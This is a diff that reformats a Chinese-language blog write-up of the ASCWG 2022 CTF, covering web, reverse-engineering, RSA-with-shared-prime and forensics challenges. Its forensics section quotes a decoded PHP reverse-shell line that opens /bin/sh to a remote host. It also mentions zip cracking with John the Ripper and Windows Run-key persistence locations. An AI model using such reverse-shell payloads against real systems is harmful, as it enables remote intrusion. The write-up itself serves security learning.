@@ -1,16 +1,14 @@
 ---
-title: "ASCWG CTF 2022 Writeup"
-date: "2022-08-10"
+title: 'ASCWG CTF 2022 Writeup'
+date: '2022-08-10'
 tags: ['Writeup']
 draft: false
-summary: "本文为Arab Security Cyber Wargames 2022比赛的WriteUp。作为阿拉伯国家的CTF比赛，发现中东地区的网络安全氛围也是非常好，交流中可以学习到很多。最终我们在737支参赛队伍排名第67位。  Sometimes you win, sometimes you learn."
+summary: '本文为Arab Security Cyber Wargames 2022比赛的WriteUp。作为阿拉伯国家的CTF比赛，发现中东地区的网络安全氛围也是非常好，交流中可以学习到很多。最终我们在737支参赛队伍排名第67位。  Sometimes you win, sometimes you learn.'
 ---
 
 本文为Arab Security Cyber Wargames 2022比赛的WriteUp。作为阿拉伯国家的CTF比赛，发现中东地区的网络安全氛围也是非常好，交流中可以学习到很多。最终我们在737支参赛队伍排名第67位。
 
 Sometimes you win, sometimes you learn.
-
-
 
 说明：本WriteUp中标志[Aha!]是赛后总结并参考其他师傅的WriteUp完成的，毕竟没有做出来的题更要记录学习。
 
@@ -22,7 +20,7 @@ Sometimes you win, sometimes you learn.
 
 ![1-1-1](/static/images/ASCWG-2022-WriteUp/1-1-1.png)
 
-![img](/static/images/ASCWG-2022-WriteUp/Ad5EXRN42DyBWy38v8uwGA.png)        
+![img](/static/images/ASCWG-2022-WriteUp/Ad5EXRN42DyBWy38v8uwGA.png)
 
 登陆进入后获得Flag：`ASCWG{\%Sca21_QS_2\!3eSKC&qw9@_warmup}`
 
@@ -34,7 +32,7 @@ Sometimes you win, sometimes you learn.
 
 **此题目展示了非常好的解决Web题目的思路：首先观察行为所生成的请求包和响应包的参数，然后在网页的js或者其他脚本源码中对参数进行搜索，从而获得前后端交互的API和逻辑。**
 
-我们可以看到，在输入错误的OTP后，服务器端会返回存有errors和reason的响应包。在primary.js中搜索相关参数我们即可获得客户端的处理逻辑。                 
+我们可以看到，在输入错误的OTP后，服务器端会返回存有errors和reason的响应包。在primary.js中搜索相关参数我们即可获得客户端的处理逻辑。
 
 ![1-2-1](/static/images/ASCWG-2022-WriteUp/1-2-1.png)
 
@@ -47,7 +45,7 @@ $(document).ready(function(){$('#subB').on('submit', function(e){e.preventDefaul
 
 访问页面即可得到最终的Flag。
 
-![img](/static/images/ASCWG-2022-WriteUp/borgOLBQxPZepYHuRwcHdA.png)        
+![img](/static/images/ASCWG-2022-WriteUp/borgOLBQxPZepYHuRwcHdA.png)
 
 ### 1-3 **Doctor X [Aha!]**
 
@@ -221,13 +219,13 @@ function SettingsComponent_form_5_Template(rf, ctx) { if (rf & 1) {
 
 该题目提供了两个二进制文件，其中一个为Dont_run.bin，另一个为PE_Anatomy.exe。通过查看PE_Anatomy.exe文件的反编译代码，其主逻辑为通过读取Dont_run.bin中的特定位置的内容，并判断该位置是否符合if判断的条件，最终运行解密函数，将隐藏在其中的flag解密并显示出来。
 
-![2-2-1](/static/images/ASCWG-2022-WriteUp/2-2-1.png) 
+![2-2-1](/static/images/ASCWG-2022-WriteUp/2-2-1.png)
 
 关于读取Dont_run.bin特定位置的内容，进行if语句进行判断。我们需要根据if判断语句中的数值，基于其类型word还是dword亦或者是i_64等对Dont_run.bin中特定位置的内容进行修改。
 
 由于修改的位置很多，所以我就不一一列举了。下面是一些例子：
 
-![2-2-2](/static/images/ASCWG-2022-WriteUp/2-2-2.png)    
+![2-2-2](/static/images/ASCWG-2022-WriteUp/2-2-2.png)
 
 ![2-2-3](/static/images/ASCWG-2022-WriteUp/2-2-3.png)
 
@@ -362,13 +360,13 @@ LABEL_78:
   }
 ```
 
-为了不进入LABEL_78，就必须让v11为0。也就必须让*v8 = v8[v9]。
+为了不进入LABEL_78，就必须让v11为0。也就必须让\*v8 = v8[v9]。
 
-而 v8[v9] = v8 + v9 = v8 + v35 - (_QWORD)"bbbbb"。
+而 v8[v9] = v8 + v9 = v8 + v35 - (\_QWORD)"bbbbb"。
 
 ![2-2-5](/static/images/ASCWG-2022-WriteUp/2-2-5.png)
 
-(_QWORD)"bbbbb" = 字符串bbbb存放的地址
+(\_QWORD)"bbbbb" = 字符串bbbb存放的地址
 
 v8 = 字符串bbbb存放的地址
 
@@ -376,15 +374,15 @@ v8 = 字符串bbbb存放的地址
 
 ![2-2-7](/static/images/ASCWG-2022-WriteUp/2-2-7.png)
 
-所以综上分析得出 v8[v9]  = v35。所以，问题只要解决v35是什么。
+所以综上分析得出 v8[v9] = v35。所以，问题只要解决v35是什么。
 
-v35 = (__int64)&lpBuffer[10 * i + 66] + lpBuffer[15];
+v35 = (\_\_int64)&lpBuffer[10 * i + 66] + lpBuffer[15];
 
-lpBuffer[15] = lpBuffer + 15*4，该地址存放的内容为 0x 0000 0080h
+lpBuffer[15] = lpBuffer + 15\*4，该地址存放的内容为 0x 0000 0080h
 
- movsxd  rax, dword ptr [rax+3Ch] 可能是跟汇编中 dword ptr 有关，这个地址指向一个双字型数据
+movsxd rax, dword ptr [rax+3Ch] 可能是跟汇编中 dword ptr 有关，这个地址指向一个双字型数据
 
-(__int64)&lpBuffer[10\*i + 66] = 第[10*i + 66]个元素在内存当中的首地址
+(\_\_int64)&lpBuffer[10\*i + 66] = 第[10*i + 66]个元素在内存当中的首地址
 
 但是按照这样的理解，和汇编代码就出现了不一致的情况。
 
@@ -394,7 +392,7 @@ lpBuffer[15] = lpBuffer + 15*4，该地址存放的内容为 0x 0000 0080h
 
 综合上面的分析呢，
 
-v8[v9] = v8 + v9 = v8 + v35 - (_QWORD)"bbbbb" = v35 = lpBuffer[15+10*i +66]
+v8[v9] = v8 + v9 = v8 + v35 - (\_QWORD)"bbbbb" = v35 = lpBuffer[15+10*i +66]
 
 所以可以根据我们就可以去寻找特定位置处的存放的内容，并根据条件判断中的内容进行修改。
 
@@ -402,7 +400,7 @@ v8[v9] = v8 + v9 = v8 + v35 - (_QWORD)"bbbbb" = v35 = lpBuffer[15+10*i +66]
 
 修改完毕之后，再次运行PE_Anatomy程序之后即能显示出来flag。
 
-![img](/static/images/ASCWG-2022-WriteUp/7fV6FNj7wZGQmIbI4MwT7Q.png)        
+![img](/static/images/ASCWG-2022-WriteUp/7fV6FNj7wZGQmIbI4MwT7Q.png)
 
 做了这个题，我有个看法但不知道对不对。我觉得汇编当中，凡是涉及到地址的相关计算，到最后都会对应到相应地址中存放的内容。而不是把计算之后的地址进行操作。
 
@@ -416,41 +414,41 @@ v8[v9] = v8 + v9 = v8 + v35 - (_QWORD)"bbbbb" = v35 = lpBuffer[15+10*i +66]
 
 ![2-2-11](/static/images/ASCWG-2022-WriteUp/2-2-11.png)
 
-通过对比汇编，可以发现  我之前对lpBuffer[15]的理解有问题。
+通过对比汇编，可以发现 我之前对lpBuffer[15]的理解有问题。
 
-![img](/static/images/ASCWG-2022-WriteUp/Ls98ve-KojUPT8YSIU80dQ.png)        
+![img](/static/images/ASCWG-2022-WriteUp/Ls98ve-KojUPT8YSIU80dQ.png)
 
-正确的理解方式，lpbuffer[15] = lpbuffer + 15\*4（至于这里为什么是15\*4(0x3C)，是因为本身Ipbuffer 是int*类型的指针，也就是Ipbuffer指向了一个int类型的数组空间，int类型在64位下刚好占32位也就是4个字节。）
+正确的理解方式，lpbuffer[15] = lpbuffer + 15\*4（至于这里为什么是15\*4(0x3C)，是因为本身Ipbuffer 是int\*类型的指针，也就是Ipbuffer指向了一个int类型的数组空间，int类型在64位下刚好占32位也就是4个字节。）
 
 ![2-2-12](/static/images/ASCWG-2022-WriteUp/2-2-12.png)
 
-**a vs. a[0] vs. \*a  vs. &a vs. &a[0]**
+**a vs. a[0] vs. \*a vs. &a vs. &a[0]**
 
-参考此[帖子]( https://blog.csdn.net/baidu_37973494/article/details/83148520).
+参考此[帖子](https://blog.csdn.net/baidu_37973494/article/details/83148520).
 
 1. a，表示数组名；
 
-    a做左值时表示整个数组的所有空间(10×4=40字节)，又因为C语言规定数组操作时要独立单个操作，不能整体操作数组，所以a不能做左值；
+   a做左值时表示整个数组的所有空间(10×4=40字节)，又因为C语言规定数组操作时要独立单个操作，不能整体操作数组，所以a不能做左值；
 
-    a做右值表示数组首元素的首地址(首元素首地址就是数组的第0个元素的起始地址，也就是a[0]的起始地址)；
+   a做右值表示数组首元素的首地址(首元素首地址就是数组的第0个元素的起始地址，也就是a[0]的起始地址)；
 
 2. a[0]，表示数组的首元素，也就是数组的第0个元素；
 
-    a[0]做左值时表示数组第0个元素对应的内存空间（连续4字节）；
+   a[0]做左值时表示数组第0个元素对应的内存空间（连续4字节）；
 
-    a[0]做右值时表示数组第0个元素的值（也就是数组第0个元素对应的内存空间中存储的那个数）；
+   a[0]做右值时表示数组第0个元素的值（也就是数组第0个元素对应的内存空间中存储的那个数）；
 
 3. &a，表示数组名a取地址，字面意思是数组的地址（数组的地址就是数组的首地址，也叫数组的起始地址）
 
-    &a不能做左值，因为&a实质是一个常量，不是变量因此不能赋值，所以自然不能做左值；
+   &a不能做左值，因为&a实质是一个常量，不是变量因此不能赋值，所以自然不能做左值；
 
-    &a做右值时表示整个数组的首地址；
+   &a做右值时表示整个数组的首地址；
 
 4. &a[0]，字面意思就是数组第0个元素的首地址（搞清楚[]和&的优先级，[]的优先级要高于&，所以a先和[]结合再取地址）；
 
-    &a[0] 做左值时表示数组首元素首地址所对应的内存空间；
+   &a[0] 做左值时表示数组首元素首地址所对应的内存空间；
 
-    &a[0] 做右值时等同于a。表示数组首元素的首地址；
+   &a[0] 做右值时等同于a。表示数组首元素的首地址；
 
 ## 3 **Crypto**
 
@@ -458,9 +456,9 @@ v8[v9] = v8 + v9 = v8 + v35 - (_QWORD)"bbbbb" = v35 = lpBuffer[15+10*i +66]
 
 题目提供了以下一段程序和一段程序的输出，题目主要实现了一个 RSA 加密过程，但是其中每个人加密过程中的 N 不同，但是 P 相同，因此 P 是关键问题。
 
-![3-1-1](/static/images/ASCWG-2022-WriteUp/3-1-1.png)     
+![3-1-1](/static/images/ASCWG-2022-WriteUp/3-1-1.png)
 
-首先我们得知 N_i = P*Q_i ，因此可以通过 gcd 算法求个最大公约数，进而求得每个 N。在获得 e、p、q 便可以获得 d，再根据 RSA 加密解密算法，C = M^e(mod N)，M = C^d(mod N) 即可求出原始消息，最后将原始消息进行 long_to_bytes 求解即可，代码如下：
+首先我们得知 N_i = P\*Q_i ，因此可以通过 gcd 算法求个最大公约数，进而求得每个 N。在获得 e、p、q 便可以获得 d，再根据 RSA 加密解密算法，C = M^e(mod N)，M = C^d(mod N) 即可求出原始消息，最后将原始消息进行 long_to_bytes 求解即可，代码如下：
 
 ```
 def gcd(a,b):#求解最大公因数方法
@@ -481,8 +479,8 @@ P2 = gcd(N[1], N[3])
 P = [P1, P2, P1, P2]
 Q = []
 for i in range(4):
-    Q.append(N[i] // P[i]) 
-    
+    Q.append(N[i] // P[i])
+
 for p, q, c, n in zip(P, Q, messages, N):
     phi = (p-1)*(q-1)
     d = libnum.invmod(E ,phi)
@@ -502,7 +500,7 @@ ASCWG{7h3_c0mM0n_9re4t_P0W3r_0f_6r0k3N_R$A}
 
 ![3-2-1](/static/images/ASCWG-2022-WriteUp/3-2-1.png)
 
-首先我们知道每一行的输出为 f * p + k，而其中的 p 是固定的，因此我们首先求 p，我们把前三行分别对 65、83、67 进行求取整除法，可以得到可能的 p，接着我们可以得到如下三个数，利用简单的知识便可以得出 p 为第二个数字。
+首先我们知道每一行的输出为 f \* p + k，而其中的 p 是固定的，因此我们首先求 p，我们把前三行分别对 65、83、67 进行求取整除法，可以得到可能的 p，接着我们可以得到如下三个数，利用简单的知识便可以得出 p 为第二个数字。
 
 ```
 83801116101404762217959833436887689169125676463370468685179624854108613659566
@@ -561,7 +559,7 @@ ASCWG{8r4in_T3s$s1n9_7h3_Ba51s_0f_9r036n3r}
 
 ### 4-1 **warmup #1**
 
-![img](/static/images/ASCWG-2022-WriteUp/UbS_1YDcMZRQj29_hoSM7A.png)        
+![img](/static/images/ASCWG-2022-WriteUp/UbS_1YDcMZRQj29_hoSM7A.png)
 
 ```
 ASCWG{7b4be24b7e1f4ef01ebb62fce8fe3470857edaf7}
@@ -577,7 +575,7 @@ ASCWG{7b4be24b7e1f4ef01ebb62fce8fe3470857edaf7}
 
 url解码后得到： `$sock=fsockopen("192.168.1.105",1234);exec("/bin/sh -i <&3 >&3 2>&3");'`
 
-![img](/static/images/ASCWG-2022-WriteUp/WMaNDf7LSLeQVfBmB0sTNg.png)        
+![img](/static/images/ASCWG-2022-WriteUp/WMaNDf7LSLeQVfBmB0sTNg.png)
 
 ```
 ASCWG{cc0e30c2dc233fc58591c987c4eaf751ff25132b}
@@ -587,7 +585,7 @@ ASCWG{cc0e30c2dc233fc58591c987c4eaf751ff25132b}
 
 本题目给出的一个img镜像文件。首先通过通过fdisk文件查看该硬盘的格式信息，发现时Apple的APFS格式，因此直接在本机上挂载读入。
 
-![img](/static/images/ASCWG-2022-WriteUp/IXdUghkTarBPTqgqYnmGZw.png)        
+![img](/static/images/ASCWG-2022-WriteUp/IXdUghkTarBPTqgqYnmGZw.png)
 
 发现了一个有密码的zip文件，其中含有Flag.txt文件。一开始观察zip文件发现其是真加密，并不是考察zip伪加密。所以我们开始打开硬盘下的所有隐藏文件开始寻找zip的密码。但是把所有看似像密码的的字符串尝试后发现都无法打开zip文件。
 
@@ -595,7 +593,7 @@ ASCWG{cc0e30c2dc233fc58591c987c4eaf751ff25132b}
 
 最后决定爆破zip文件。这里采用的是John the Ripper密码破解工具，词表选择rockyou.txt，很快就爆破出了密码。
 
-![img](/static/images/ASCWG-2022-WriteUp/mo97SQOJxtMKDKZS9IJQ0Q.png)                         ![img](/static/images/ASCWG-2022-WriteUp/5K_WPrmLAyFNN6rq1-AMxw.png)        
+![img](/static/images/ASCWG-2022-WriteUp/mo97SQOJxtMKDKZS9IJQ0Q.png) ![img](/static/images/ASCWG-2022-WriteUp/5K_WPrmLAyFNN6rq1-AMxw.png)
 
 ```
 ASCWG{M4C_4N6_1$_Co0l}
@@ -626,7 +624,7 @@ ASCWG{M4C_4N6_1$_Co0l}
 最终flag以base64编码的形式分成三段藏在以下三个值里。拼接后即可得到一段Python代码，运行后即可拿到flag。
 
 ```
-HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run 
+HKEY_LOCAL_MACHINE\Software\Microsoft\Windows\CurrentVersion\Run
 HKEY_USERS\SOFTWARE\Microsoft\Windows\CurrentVersion\Run
 HKEY_USERS\SOFTWARE\Microsoft\Windows\CurrentVersion\Screensavers\ssText3d\Screen 3
 ```
